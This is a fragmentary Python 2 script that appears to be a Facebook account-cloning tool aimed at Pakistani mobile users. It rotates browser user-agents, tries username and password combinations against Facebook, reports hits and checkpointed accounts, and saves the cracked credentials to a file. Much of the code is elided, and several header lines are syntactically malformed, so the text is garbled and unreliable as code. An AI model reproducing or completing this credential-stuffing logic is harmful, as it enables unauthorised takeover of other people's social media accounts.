...
br.addheaders = [('user_agent = random.choice(['Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36')]
br.addheaders = [('Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';]')]
br.addheaders = [('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0')]
br.addheaders = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240;]')]
br.addheaders = [('Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36')]
def keluar():
	print 'Thanks.'
	os.sys.exit()
...
logo1 = """
\033[1;91m\x1b[1;94m_________________




...
\033[1;97m----------------------\x1b[1;96m IM THE ONE--------------------
"""
...
def action():
    ...
    if peak =='':
        ...
        print '\x1b[1;92mtelenor.\x1b[1;91mjazz.\x1b[1;93mzong.\x1b[1;95mwarid.uphone'
        try:
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;95m(zeshi)  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(\x1b[1;95m checkpoint) ' + k + c + user + '  |  ' + pass1
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(\x1b[1;93m  old ) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
